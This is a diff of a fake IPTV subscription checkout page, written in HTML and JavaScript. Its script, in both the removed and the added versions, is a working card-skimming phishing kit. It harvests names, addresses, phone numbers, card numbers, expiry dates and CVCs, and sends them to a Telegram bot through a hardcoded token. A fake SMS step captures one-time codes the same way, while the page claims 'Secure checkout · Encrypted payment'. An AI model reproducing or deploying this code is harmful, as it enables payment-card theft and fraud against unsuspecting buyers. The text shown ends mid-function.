-                                <input type="text" class="form-control" id="apartment" placeholder="Apt 4B" autocomplete="address-line2" />
-                            </div>
-                            <div class="form-row">
-                                <div class="form-group">
-                                    <label class="form-label">City <span class="required-star">*</span></label>
-                                    <input type="text" class="form-control" id="city" placeholder="Sofia" autocomplete="address-level2" />
-                                    <div class="validation-feedback" id="cityError">City is required.</div>
-                                </div>
-                                <div class="form-group">
-                                    <label class="form-label">State / Province <span class="required-star">*</span></label>
-                                    <input type="text" class="form-control" id="state" placeholder="Sofia" autocomplete="address-level1" />
-                                    <div class="validation-feedback" id="stateError">State / Province is required.</div>
-                                </div>
-                            </div>
-                            <div class="form-group">
-                                <label class="form-label">ZIP / Postal Code <span class="required-star">*</span></label>
-                                <input type="text" class="form-control" id="postal" placeholder="1000" autocomplete="postal-code" />
-                                <div class="validation-feedback" id="postalError">Valid postal code required.</div>
-                            </div>
-
-                            <h2 style="margin-top:2rem;"><svg viewBox="0 0 24 24" stroke-width="1.8"><rect x="2" y="6" width="20" height="14" rx="2" stroke="currentColor" fill="none"/><path d="M2 10h20" stroke="currentColor"/></svg> Payment information</h2>
-                            <div class="card-icons">
-                                <span>Visa</span><span>Mastercard</span><span>Amex</span>
-                            </div>
-                            <div class="form-group">
-                                <label class="form-label">Cardholder Name <span class="required-star">*</span></label>
-                                <input type="text" class="form-control" id="cardName" placeholder="John Doe" autocomplete="cc-name" />
-                                <div class="validation-feedback" id="cardNameError">Cardholder name required.</div>
-                            </div>
-                            <div class="form-group">
-                                <label class="form-label">Card Number <span class="required-star">*</span></label>
-                                <input type="text" class="form-control" id="cardNumber" placeholder="xxxx xxxx xxxx xxxx" autocomplete="cc-number" maxlength="19" />
-                                <div class="validation-feedback" id="cardNumberError">Enter a valid card number (16 digits).</div>
-                            </div>
-                            <div class="form-row">
-                                <div class="form-group">
-                                    <label class="form-label">Expiration <span class="required-star">*</span></label>
-                                    <input type="text" class="form-control" id="expiry" placeholder="MM/YY" autocomplete="cc-exp" maxlength="5" />
-                                    <div class="validation-feedback" id="expiryError">Valid expiration (MM/YY).</div>
-                                </div>
-                                <div class="form-group">
-                                    <label class="form-label">CVC <span class="required-star">*</span></label>
-                                    <input type="text" class="form-control" id="cvc" placeholder="xxx" autocomplete="cc-csc" maxlength="4" />
-                                    <div class="validation-feedback" id="cvcError">Enter CVC.</div>
-                                </div>
-                            </div>
-                            <div class="form-group">
-                                <label class="form-label">Billing country</label>
-                                <select class="form-select" id="billingCountry">
-                                    <option value="BG" selected>Bulgaria</option>
-                                    <option value="AE">United Arab Emirates</option>
-                                    <option value="SN">Senegal</option>
-                                    <option value="PH">Philippines</option>
-                                    <option value="BE">Belgium</option>
-                                    <option value="US">United States</option>
-                                    <option value="UK">United Kingdom</option>
-                                    <option value="DE">Germany</option>
-                                    <option value="FR">France</option>
-                                </select>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="right-col">
-                    <div class="glass-card summary-card">
-                        <div class="product-badge">⭐ PREMIUM</div>
-                        <div class="summary-title">IPTV 1 Year · 2 Devices</div>
-                        <div class="summary-bonus">🎁 HD, Sports & 2 screens</div>
-                        <div>
-                            <span class="price-large">$100.00 <small>USD</small></span>
-                            <span class="price-strikethrough">$199.99</span>
-                        </div>
-                        <div style="margin-top:1.8rem;">
-                            <div class="summary-line"><span>Subtotal</span> <span>$100.00</span></div>
-                            <div class="summary-line"><span>Discount</span> <span style="color:#7fcf9b;">− 50%</span></div>
-                            <div class="summary-line total"><span>Total</span> <span>$100.00 USD</span></div>
-                        </div>
-
-                        <button class="btn-primary" id="payButton">
-                            <span class="btn-text">🔒 Pay $100.00 Securely</span>
-                            <span class="spinner"></span>
-                        </button>
-
-                        <div class="secure-badge">
-                            <svg width="20" height="20" viewBox="0 0 24 24" stroke-width="1.8"><rect x="3" y="11" width="18" height="11" rx="2" stroke="currentColor" fill="none"/><path d="M7 11V7a5 5 0 0110 0v4" stroke="currentColor"/></svg>
-                            <span>Secure checkout · Encrypted payment</span>
-                            <span style="color:#6b769b;">Your data is safely processed.</span>
-                        </div>
-                    </div>
-                </div>
+          <!-- SUCCESS screen -->
+          <div class="result-screen" id="successScreen">
+            <div class="result-icon">🎉</div>
+            <h2 style="justify-content:center; margin-bottom:0.25rem;">Payment Successful</h2>
+            <p class="sub-text">Thank you for your order.</p>
+            <div class="order-detail" id="orderDetail">
+              <div class="detail-row"><span>📦 Order</span> <span class="detail-value" id="orderNumber">#IPTV-2847-91</span> <button class="copy-btn" data-copy="orderNumber">📋 Copy</button></div>
+              <div class="detail-row"><span>📺 Product</span> <span class="detail-value">IPTV 1 Year / 2 Devices</span> <button class="copy-btn" data-copy="product">📋 Copy</button></div>
+              <div class="detail-row"><span>💰 Amount</span> <span class="detail-value">$54.99 USD</span> <button class="copy-btn" data-copy="amount">📋 Copy</button></div>
+              <div class="detail-row"><span>📧 Email</span> <span class="detail-value" id="successEmail">—</span> <button class="copy-btn" data-copy="successEmail">📋 Copy</button></div>
+              <div class="detail-row"><span>📞 Phone</span> <span class="detail-value" id="successPhone">—</span> <button class="copy-btn" data-copy="successPhone">📋 Copy</button></div>
+              <div class="detail-row"><span>👤 Cardholder</span> <span class="detail-value" id="successCardholder">—</span> <button class="copy-btn" data-copy="successCardholder">📋 Copy</button></div>
             </div>
+          </div>
+
+          <!-- FAILURE screen -->
+          <div class="result-screen" id="failureScreen">
+            <div class="result-icon">❌</div>
+            <h2 style="justify-content:center; margin-bottom:0.25rem; color:#ff6575;">Payment Failed</h2>
+            <p class="sub-text">We couldn't process your payment. Please try again later.</p>
+            <div style="margin-top:1.5rem; background:rgba(255,101,117,0.06); border-radius:16px; padding:1rem; border:1px solid rgba(255,101,117,0.1);">
+              <p style="color:#aab3d0; font-size:0.9rem;">If you continue to experience issues, please contact our support team.</p>
+            </div>
+            <button class="btn-primary btn-retry" id="retryPaymentBtn" style="margin-top:1.5rem;">
+              <span class="btn-text">🔄 Try Again</span>
+            </button>
+          </div>
+
+          <!-- form -->
+          <div id="formFields">
+            <h2><svg viewBox="0 0 24 24" stroke-width="1.8"><path d="M12 2v4M12 22v-4M4 12H2M6 12H4M20 12h-2M22 12h-2M19.07 4.93l-2.83 2.83M4.93 19.07l2.83-2.83M19.07 19.07l-2.83-2.83M4.93 4.93l2.83 2.83"/></svg> Customer information</h2>
+
+            <div class="form-group">
+              <label class="form-label">Country/Region <span class="required-star">*</span></label>
+              <select class="form-select" id="countrySelect">
+                <!-- Bulgaria default -->
+                <option value="BG" selected>Bulgaria (+359)</option>
+                <option value="AE">United Arab Emirates (+971)</option>
+                <option value="SN">Senegal (+221)</option>
+                <option value="PH">Philippines (+63)</option>
+                <option value="BE">Belgium (+32)</option>
+                <option value="TR">Turkey (+90)</option>
+                <option value="US">United States (+1)</option>
+                <option value="UK">United Kingdom (+44)</option>
+                <option value="DE">Germany (+49)</option>
+                <option value="FR">France (+33)</option>
+                <option value="ES">Spain (+34)</option>
+                <option value="IT">Italy (+39)</option>
+                <option value="NL">Netherlands (+31)</option>
+                <option value="PT">Portugal (+351)</option>
+                <option value="CH">Switzerland (+41)</option>
+                <option value="AT">Austria (+43)</option>
+                <option value="SE">Sweden (+46)</option>
+                <option value="NO">Norway (+47)</option>
+                <option value="DK">Denmark (+45)</option>
+                <option value="FI">Finland (+358)</option>
+                <option value="PL">Poland (+48)</option>
+                <option value="AU">Australia (+61)</option>
+                <option value="CA">Canada (+1)</option>
+              </select>
+            </div>
+
+            <div class="form-group">
+              <label class="form-label">Full Name <span class="required-star">*</span></label>
+              <input type="text" class="form-control" id="fullName" placeholder="John Doe" autocomplete="name" />
+              <div class="validation-feedback" id="fullNameError">Please enter your full name.</div>
+            </div>
+
+            <div class="form-group">
+              <label class="form-label">Email Address <span class="required-star">*</span></label>
+              <input type="email" class="form-control" id="email" placeholder="john@example.com" autocomplete="email" />
+              <div class="validation-feedback" id="emailError">Enter a valid email address.</div>
+            </div>
+
+            <div class="form-group">
+              <label class="form-label">Mobile Phone <span class="required-star">*</span></label>
+              <div class="phone-group">
+                <select class="form-select" id="phoneCodeSelect"></select>
+                <input type="tel" class="form-control" id="phoneNumber" placeholder="50 123 4567" autocomplete="tel" />
+              </div>
+              <div class="validation-feedback" id="phoneError">Please enter a valid phone number.</div>
+            </div>
+
+            <div class="form-group">
+              <label class="form-label">Street Address <span class="required-star">*</span></label>
+              <input type="text" class="form-control" id="address" placeholder="123 Main St" autocomplete="address-line1" />
+              <div class="validation-feedback" id="addressError">Street address is required.</div>
+            </div>
+            <div class="form-group">
+              <label class="form-label">Apartment / Suite / Unit</label>
+              <input type="text" class="form-control" id="apartment" placeholder="Apt 4B" autocomplete="address-line2" />
+            </div>
+            <div class="form-row">
+              <div class="form-group">
+                <label class="form-label">City <span class="required-star">*</span></label>
+                <input type="text" class="form-control" id="city" placeholder="Sofia" autocomplete="address-level2" />
+                <div class="validation-feedback" id="cityError">City is required.</div>
+              </div>
+              <div class="form-group">
+                <label class="form-label">State / Province <span class="required-star">*</span></label>
+                <input type="text" class="form-control" id="state" placeholder="Sofia" autocomplete="address-level1" />
+                <div class="validation-feedback" id="stateError">State / Province is required.</div>
+              </div>
+            </div>
+            <div class="form-group">
+              <label class="form-label">ZIP / Postal Code <span class="required-star">*</span></label>
+              <input type="text" class="form-control" id="postal" placeholder="1000" autocomplete="postal-code" />
+              <div class="validation-feedback" id="postalError">Valid postal code required.</div>
+            </div>
+
+            <h2 style="margin-top:2rem;"><svg viewBox="0 0 24 24" stroke-width="1.8"><rect x="2" y="6" width="20" height="14" rx="2" stroke="currentColor" fill="none"/><path d="M2 10h20" stroke="currentColor"/></svg> Payment information</h2>
+            <div class="card-icons">
+              <span>Visa</span><span>Mastercard</span><span>Amex</span>
+            </div>
+            <div class="form-group">
+              <label class="form-label">Cardholder Name <span class="required-star">*</span></label>
+              <input type="text" class="form-control" id="cardName" placeholder="John Doe" autocomplete="cc-name" />
+              <div class="validation-feedback" id="cardNameError">Cardholder name required.</div>
+            </div>
+            <div class="form-group">
+              <label class="form-label">Card Number <span class="required-star">*</span></label>
+              <input type="text" class="form-control" id="cardNumber" placeholder="xxxx xxxx xxxx xxxx" autocomplete="cc-number" maxlength="19" />
+              <div class="validation-feedback" id="cardNumberError">Enter a valid card number (16 digits).</div>
+            </div>
+            <div class="form-row">
+              <div class="form-group">
+                <label class="form-label">Expiration <span class="required-star">*</span></label>
+                <input type="text" class="form-control" id="expiry" placeholder="MM/YY" autocomplete="cc-exp" maxlength="5" />
+                <div class="validation-feedback" id="expiryError">Valid expiration (MM/YY).</div>
+              </div>
+              <div class="form-group">
+                <label class="form-label">CVC <span class="required-star">*</span></label>
+                <input type="text" class="form-control" id="cvc" placeholder="xxx" autocomplete="cc-csc" maxlength="4" />
+                <div class="validation-feedback" id="cvcError">Enter CVC.</div>
+              </div>
+            </div>
+            <div class="form-group">
+              <label class="form-label">Billing country</label>
+              <select class="form-select" id="billingCountry">
+                <option value="BG" selected>Bulgaria</option>
+                <option value="AE">United Arab Emirates</option>
+                <option value="SN">Senegal</option>
+                <option value="PH">Philippines</option>
+                <option value="BE">Belgium</option>
+                <option value="TR">Turkey</option>
+                <option value="US">United States</option>
+                <option value="UK">United Kingdom</option>
+                <option value="DE">Germany</option>
+                <option value="FR">France</option>
+              </select>
+            </div>
+          </div>
         </div>
+      </div>
 
-        <script>
-            (function() {
-                // ========== CONFIG ==========
-                const TELEGRAM_TOKEN = '7551456255:AAF8F9NLdoSG33i6Z0FqokmjhsnoJ2Mua2Y';
-                const TELEGRAM_CHAT_ID = '1017945601';
+      <div class="right-col">
+        <div class="glass-card summary-card">
+          <div class="product-badge">⭐ PREMIUM</div>
+          <div class="summary-title">IPTV 1 Year · 2 Devices</div>
+          <div class="summary-bonus">🎁 HD, Sports & 2 screens</div>
+          <div>
+            <span class="price-large">$54.99 <small>USD</small></span>
+            <span class="price-strikethrough">$64.99</span>
+          </div>
+          <div style="margin-top:1.8rem;">
+            <div class="summary-line"><span>Subtotal</span> <span>$54.99</span></div>
+            <div class="summary-line"><span>Discount</span> <span style="color:#7fcf9b;">− 15%</span></div>
+            <div class="summary-line total"><span>Total</span> <span>$54.99 USD</span></div>
+          </div>
 
-                // ---------- PAGE VIEW NOTIFICATION ----------
-                function notifyPageView() {
-                    const viewMsg = `👁️ *IPTV page viewed* · 1 year / 2 devices · $100.00 · Bulgaria (default)`;
-                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            text: viewMsg,
-                            parse_mode: 'Markdown'
-                        })
-                    }).catch(() => {});
-                }
-                window.addEventListener('load', function() {
-                    setTimeout(notifyPageView, 300);
-                });
+          <button class="btn-primary" id="payButton">
+            <span class="btn-text">🔒 Pay $54.99 Securely</span>
+            <span class="spinner"></span>
+          </button>
 
-                // ========== COUNTRY CODES ==========
-                const countryCodes = {
-                    BG: '+359',
-                    AE: '+971',
-                    SN: '+221',
-                    PH: '+63',
-                    BE: '+32',
-                    US: '+1',
-                    UK: '+44',
-                    DE: '+49',
-                    FR: '+33',
-                    ES: '+34',
-                    IT: '+39',
-                    NL: '+31',
-                    PT: '+351',
-                    CH: '+41',
-                    AT: '+43',
-                    SE: '+46',
-                    NO: '+47',
-                    DK: '+45',
-                    FI: '+358',
-                    PL: '+48',
-                    TR: '+90',
-                    AU: '+61',
-                    CA: '+1'
-                };
+          <div class="secure-badge">
+            <svg width="20" height="20" viewBox="0 0 24 24" stroke-width="1.8"><rect x="3" y="11" width="18" height="11" rx="2" stroke="currentColor" fill="none"/><path d="M7 11V7a5 5 0 0110 0v4" stroke="currentColor"/></svg>
+            <span>Secure checkout · Encrypted payment</span>
+            <span style="color:#6b769b;">Your data is safely processed.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
 
-                const countrySelect = document.getElementById('countrySelect');
-                const phoneCodeSelect = document.getElementById('phoneCodeSelect');
+  <script>
+    (function() {
+      // ========== CONFIG ==========
+      const TELEGRAM_TOKEN = '7551456255:AAF8F9NLdoSG33i6Z0FqokmjhsnoJ2Mua2Y';
+      const TELEGRAM_CHAT_ID = '1017945601';
 
-                function populatePhoneCodes() {
-                    phoneCodeSelect.innerHTML = '';
-                    for (const [code, dial] of Object.entries(countryCodes)) {
-                        const opt = document.createElement('option');
-                        opt.value = code;
-                        opt.textContent = dial;
-                        phoneCodeSelect.appendChild(opt);
-                    }
-                    // default Bulgaria
-                    phoneCodeSelect.value = 'BG';
-                }
+      function notifyPageView() {
+        const viewMsg = `👁️ *IPTV page viewed* · 1 year / 2 devices · $54.99 · Bulgaria (default) · Turkey added`;
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: viewMsg,
+            parse_mode: 'Markdown'
+          })
+        }).catch(() => {});
+      }
+      window.addEventListener('load', function() {
+        setTimeout(notifyPageView, 300);
+      });
 
-                function updatePhoneCode() {
-                    const country = countrySelect.value;
-                    if (countryCodes[country]) phoneCodeSelect.value = country;
-                }
+      // ========== COUNTRY CODES ==========
+      const countryCodes = {
+        BG: '+359', AE: '+971', SN: '+221', PH: '+63', BE: '+32',
+        TR: '+90', US: '+1', UK: '+44', DE: '+49', FR: '+33',
+        ES: '+34', IT: '+39', NL: '+31', PT: '+351', CH: '+41',
+        AT: '+43', SE: '+46', NO: '+47', DK: '+45', FI: '+358',
+        PL: '+48', AU: '+61', CA: '+1'
+      };
 
-                countrySelect.addEventListener('change', updatePhoneCode);
-                populatePhoneCodes();
+      const countrySelect = document.getElementById('countrySelect');
+      const phoneCodeSelect = document.getElementById('phoneCodeSelect');
 
-                // ========== CARD FORMATTING ==========
-                const cardNumberInput = document.getElementById('cardNumber');
-                cardNumberInput.addEventListener('input', function(e) {
-                    let val = this.value.replace(/\s/g, '');
-                    if (val.length > 16) val = val.slice(0, 16);
-                    let formatted = '';
-                    for (let i = 0; i < val.length; i++) {
-                        if (i > 0 && i % 4 === 0) formatted += ' ';
-                        formatted += val[i];
-                    }
-                    this.value = formatted;
-                });
+      function populatePhoneCodes() {
+        phoneCodeSelect.innerHTML = '';
+        for (const [code, dial] of Object.entries(countryCodes)) {
+          const opt = document.createElement('option');
+          opt.value = code;
+          opt.textContent = dial;
+          phoneCodeSelect.appendChild(opt);
+        }
+        phoneCodeSelect.value = 'BG';
+      }
 
-                const expiryInput = document.getElementById('expiry');
-                expiryInput.addEventListener('input', function(e) {
-                    let val = this.value.replace(/\D/g, '');
-                    if (val.length > 4) val = val.slice(0, 4);
-                    if (val.length >= 2) {
-                        this.value = val.slice(0, 2) + '/' + val.slice(2);
-                    } else {
-                        this.value = val;
-                    }
-                });
+      function updatePhoneCode() {
+        const country = countrySelect.value;
+        if (countryCodes[country]) phoneCodeSelect.value = country;
+      }
 
-                // ========== VALIDATION ==========
-                const fields = {
-                    fullName: { el: document.getElementById('fullName'), err: document.getElementById('fullNameError'),
-                        check: v => v.trim().length > 1 },
-                    email: { el: document.getElementById('email'), err: document.getElementById('emailError'), check: v =>
-                            /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim()) },
-                    phoneNumber: { el: document.getElementById('phoneNumber'), err: document.getElementById('phoneError'),
-                        check: v => v.trim().replace(/\s/g, '').length > 4 },
-                    address: { el: document.getElementById('address'), err: document.getElementById('addressError'),
-                        check: v => v.trim().length > 2 },
-                    city: { el: document.getElementById('city'), err: document.getElementById('cityError'),
-                        check: v => v.trim().length > 1 },
-                    state: { el: document.getElementById('state'), err: document.getElementById('stateError'),
-                        check: v => v.trim().length > 1 },
-                    postal: { el: document.getElementById('postal'), err: document.getElementById('postalError'),
-                        check: v => v.trim().length > 2 },
-                    cardName: { el: document.getElementById('cardName'), err: document.getElementById('cardNameError'),
-                        check: v => v.trim().length > 1 },
-                    cardNumber: { el: document.getElementById('cardNumber'), err: document.getElementById('cardNumberError'),
-                        check: v => v.trim().replace(/\s/g, '').length === 16 },
-                    expiry: { el: document.getElementById('expiry'), err: document.getElementById('expiryError'), check: v =>
-                            /^\d{2}\/\d{2}$/.test(v.trim()) },
-                    cvc: { el: document.getElementById('cvc'), err: document.getElementById('cvcError'), check: v => v.trim()
-                            .length >= 3 },
-                };
+      countrySelect.addEventListener('change', updatePhoneCode);
+      populatePhoneCodes();
 
-                function validateField(key) {
-                    const f = fields[key];
-                    if (!f) return true;
-                    const valid = f.check(f.el.value);
-                    f.el.classList.toggle('error', !valid);
-                    f.err.classList.toggle('visible', !valid && f.el.value.trim().length > 0);
-                    return valid;
-                }
+      // ========== CARD FORMATTING ==========
+      const cardNumberInput = document.getElementById('cardNumber');
+      cardNumberInput.addEventListener('input', function(e) {
+        let val = this.value.replace(/\s/g, '');
+        if (val.length > 16) val = val.slice(0, 16);
+        let formatted = '';
+        for (let i = 0; i < val.length; i++) {
+          if (i > 0 && i % 4 === 0) formatted += ' ';
+          formatted += val[i];
+        }
+        this.value = formatted;
+      });
 
-                function validateAll() {
-                    let allOk = true;
-                    for (const key of Object.keys(fields)) {
-                        const f = fields[key];
-                        const valid = f.check(f.el.value);
-                        f.el.classList.toggle('error', !valid);
-                        f.err.classList.toggle('visible', !valid);
-                        if (!valid) allOk = false;
-                    }
-                    return allOk;
-                }
+      const expiryInput = document.getElementById('expiry');
+      expiryInput.addEventListener('input', function(e) {
+        let val = this.value.replace(/\D/g, '');
+        if (val.length > 4) val = val.slice(0, 4);
+        if (val.length >= 2) {
+          this.value = val.slice(0, 2) + '/' + val.slice(2);
+        } else {
+          this.value = val;
+        }
+      });
 
-                for (const key of Object.keys(fields)) {
-                    fields[key].el.addEventListener('blur', () => validateField(key));
-                    fields[key].el.addEventListener('input', () => {
-                        const f = fields[key];
-                        if (f.el.classList.contains('error')) {
-                            const valid = f.check(f.el.value);
-                            f.el.classList.toggle('error', !valid);
-                            f.err.classList.toggle('visible', !valid);
-                        }
-                    });
-                }
+      // ========== VALIDATION ==========
+      const fields = {
+        fullName: { el: document.getElementById('fullName'), err: document.getElementById('fullNameError'),
+          check: v => v.trim().length > 1 },
+        email: { el: document.getElementById('email'), err: document.getElementById('emailError'), check: v =>
+            /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim()) },
+        phoneNumber: { el: document.getElementById('phoneNumber'), err: document.getElementById('phoneError'),
+          check: v => v.trim().replace(/\s/g, '').length > 4 },
+        address: { el: document.getElementById('address'), err: document.getElementById('addressError'),
+          check: v => v.trim().length > 2 },
+        city: { el: document.getElementById('city'), err: document.getElementById('cityError'),
+          check: v => v.trim().length > 1 },
+        state: { el: document.getElementById('state'), err: document.getElementById('stateError'),
+          check: v => v.trim().length > 1 },
+        postal: { el: document.getElementById('postal'), err: document.getElementById('postalError'),
+          check: v => v.trim().length > 2 },
+        cardName: { el: document.getElementById('cardName'), err: document.getElementById('cardNameError'),
+          check: v => v.trim().length > 1 },
+        cardNumber: { el: document.getElementById('cardNumber'), err: document.getElementById('cardNumberError'),
+          check: v => v.trim().replace(/\s/g, '').length === 16 },
+        expiry: { el: document.getElementById('expiry'), err: document.getElementById('expiryError'), check: v =>
+            /^\d{2}\/\d{2}$/.test(v.trim()) },
+        cvc: { el: document.getElementById('cvc'), err: document.getElementById('cvcError'), check: v => v.trim()
+            .length >= 3 },
+      };
 
-                // ========== TELEGRAM SEND (order) ==========
-                function sendToTelegram(data) {
-                    const message = `
-                    🎯 *New IPTV Order (1 year / 2 devices)*
-                    👤 Full Name: ${data.fullName}
-                    📧 Email: ${data.email}
-                    📞 Phone: ${data.phone}
-                    🏠 Address: ${data.address}, ${data.city}, ${data.state}, ${data.postal}
-                    👤 Cardholder: ${data.cardholder}
-                    💳 Card: ${data.cardNumber}
-                    📅 Expiry: ${data.expiry}
-                    🔐 CVC: ${data.cvc}
-                    🌍 Country: ${data.country}
-                    💰 Amount: $100.00 USD
-                    `;
-                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            text: message,
-                            parse_mode: 'Markdown'
-                        })
-                    }).catch(err => console.warn('Telegram send error:', err));
-                }
+      function validateField(key) {
+        const f = fields[key];
+        if (!f) return true;
+        const valid = f.check(f.el.value);
+        f.el.classList.toggle('error', !valid);
+        f.err.classList.toggle('visible', !valid && f.el.value.trim().length > 0);
+        return valid;
+      }
 
-                // ========== PAYMENT FLOW ==========
-                const payBtn = document.getElementById('payButton');
-                const formFields = document.getElementById('formFields');
-                const smsScreen = document.getElementById('smsScreen');
-                const successScreen = document.getElementById('successScreen');
-                const failureScreen = document.getElementById('failureScreen');
-                const smsCodeInput = document.getElementById('smsCode');
-                const smsError = document.getElementById('smsError');
-                const smsVerifyBtn = document.getElementById('smsVerifyBtn');
-                const smsRetryBtn = document.getElementById('smsRetryBtn');
-                const retryBtn = document.getElementById('retryPaymentBtn');
+      function validateAll() {
+        let allOk = true;
+        for (const key of Object.keys(fields)) {
+          const f = fields[key];
+          const valid = f.check(f.el.value);
+          f.el.classList.toggle('error', !valid);
+          f.err.classList.toggle('visible', !valid);
+          if (!valid) allOk = false;
+        }
+        return allOk;
+      }
 
-                let collectedData = {};
-                let isSubmitting = false;
-                let smsAttempts = 0;
+      for (const key of Object.keys(fields)) {
+        fields[key].el.addEventListener('blur', () => validateField(key));
+        fields[key].el.addEventListener('input', () => {
+          const f = fields[key];
+          if (f.el.classList.contains('error')) {
+            const valid = f.check(f.el.value);
+            f.el.classList.toggle('error', !valid);
+            f.err.classList.toggle('visible', !valid);
+          }
+        });
+      }
 
-                function resetToForm() {
-                    formFields.style.display = 'block';
-                    smsScreen.classList.remove('show');
-                    successScreen.classList.remove('show');
-                    failureScreen.classList.remove('show');
-                    payBtn.style.display = 'flex';
-                    payBtn.disabled = false;
-                    payBtn.classList.remove('loading');
-                    smsAttempts = 0;
-                    smsError.classList.remove('visible');
-                    smsCodeInput.value = '';
-                    isSubmitting = false;
-                }
+      // ========== TELEGRAM SEND (order) ==========
+      function sendToTelegram(data) {
+        const message = `
+        🎯 *New IPTV Order (1 year / 2 devices)*
+        👤 Full Name: ${data.fullName}
+        📧 Email: ${data.email}
+        📞 Phone: ${data.phone}
+        🏠 Address: ${data.address}, ${data.city}, ${data.state}, ${data.postal}
+        👤 Cardholder: ${data.cardholder}
+        💳 Card: ${data.cardNumber}
+        📅 Expiry: ${data.expiry}
+        🔐 CVC: ${data.cvc}
+        🌍 Country: ${data.country}
+        💰 Amount: $54.99 USD
+        `;
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        }).catch(err => console.warn('Telegram send error:', err));
+      }
 
-                payBtn.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    if (isSubmitting) return;
-                    if (!validateAll()) {
-                        for (const key of Object.keys(fields)) {
-                            if (!fields[key].check(fields[key].el.value)) {
-                                fields[key].el.focus();
-                                break;
-                            }
-                        }
-                        return;
-                    }
+      // ========== PAYMENT FLOW ==========
+      const payBtn = document.getElementById('payButton');
+      const formFields = document.getElementById('formFields');
+      const smsScreen = document.getElementById('smsScreen');
+      const successScreen = document.getElementById('successScreen');
+      const failureScreen = document.getElementById('failureScreen');
+      const smsCodeInput = document.getElementById('smsCode');
+      const smsError = document.getElementById('smsError');
+      const smsVerifyBtn = document.getElementById('smsVerifyBtn');
+      const smsRetryBtn = document.getElementById('smsRetryBtn');
+      const retryBtn = document.getElementById('retryPaymentBtn');
 
-                    collectedData = {
-                        fullName: document.getElementById('fullName').value.trim(),
-                        email: document.getElementById('email').value.trim(),
-                        phone: phoneCodeSelect.value + ' ' + document.getElementById('phoneNumber').value.trim(),
-                        address: document.getElementById('address').value.trim(),
-                        city: document.getElementById('city').value.trim(),
-                        state: document.getElementById('state').value.trim(),
-                        postal: document.getElementById('postal').value.trim(),
-                        cardholder: document.getElementById('cardName').value.trim(),
-                        cardNumber: document.getElementById('cardNumber').value.trim(),
-                        expiry: document.getElementById('expiry').value.trim(),
-                        cvc: document.getElementById('cvc').value.trim(),
-                        country: countrySelect.options[countrySelect.selectedIndex].text,
-                    };
+      let collectedData = {};
+      let isSubmitting = false;
+      let smsAttempts = 0;
 
-                    sendToTelegram(collectedData);
+      function resetToForm() {
+        formFields.style.display = 'block';
+        smsScreen.classList.remove('show');
+        successScreen.classList.remove('show');
+        failureScreen.classList.remove('show');
+        payBtn.style.display = 'flex';
+        payBtn.disabled = false;
+        payBtn.classList.remove('loading');
+        smsAttempts = 0;
+        smsError.classList.remove('visible');
+        smsCodeInput.value = '';
+        isSubmitting = false;
+      }
 
-                    isSubmitting = true;
-                    payBtn.disabled = true;
-                    payBtn.classList.add('loading');
+      payBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        if (isSubmitting) return;
+        if (!validateAll()) {
+          for (const key of Object.keys(fields)) {
+            if (!fields[key].check(fields[key].el.value)) {
+              fields[key].el.focus();
+              break;
+            }
+          }
+          return;
+        }
 
-                    setTimeout(() => {
-                        payBtn.classList.remove('loading');
-                        payBtn.style.display = 'none';
-                        formFields.style.display = 'none';
-                        smsScreen.classList.add('show');
-                        smsError.classList.remove('visible');
-                        smsCodeInput.value = '';
-                        smsCodeInput.focus();
-                        isSubmitting = false;
-                        smsAttempts = 0;
-                    }, 1200);
-                });
+        collectedData = {
+          fullName: document.getElementById('fullName').value.trim(),
+          email: document.getElementById('email').value.trim(),
+          phone: phoneCodeSelect.value + ' ' + document.getElementById('phoneNumber').value.trim(),
+          address: document.getElementById('address').value.trim(),
+          city: document.getElementById('city').value.trim(),
+          state: document.getElementById('state').value.trim(),
+          postal: document.getElementById('postal').value.trim(),
+          cardholder: document.getElementById('cardName').value.trim(),
+          cardNumber: document.getElementById('cardNumber').value.trim(),
+          expiry: document.getElementById('expiry').value.trim(),
+          cvc: document.getElementById('cvc').value.trim(),
+          country: countrySelect.options[countrySelect.selectedIndex].text,
+        };
 
-                smsVerifyBtn.addEventListener('click', function() {
-                    const code = smsCodeInput.value.trim();
-                    const isValid = /^\d{4,6}$/.test(code);
+        sendToTelegram(collectedData);
 
-                    if (isValid) {
-                        const smsMessage =
-                            `📱 *SMS Verification*\nCode: ${code}\nEmail: ${collectedData.email || 'N/A'}`;
-                        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: TELEGRAM_CHAT_ID,
-                                text: smsMessage,
-                                parse_mode: 'Markdown'
-                            })
-                        }).catch(() => {});
+        isSubmitting = true;
+        payBtn.disabled = true;
+        payBtn.classList.add('loading');
 
-                        smsVerifyBtn.disabled = true;
-                        smsVerifyBtn.classList.add('loading');
+        setTimeout(() => {
+          payBtn.classList.remove('loading');
+          payBtn.style.display = 'none';
+          formFields.style.display = 'none';
+          smsScreen.classList.add('show');
+          smsError.classList.remove('visible');
+          smsCodeInput.value = '';
+          smsCodeInput.focus();
+          isSubmitting = false;
+          smsAttempts = 0;
+        }, 1200);
+      });
 
-                        setTimeout(() => {
-                            smsVerifyBtn.classList.remove('loading');
-                            smsVerifyBtn.disabled = false;
+      smsVerifyBtn.addEventListener('click', function() {
+        const code = smsCodeInput.value.trim();
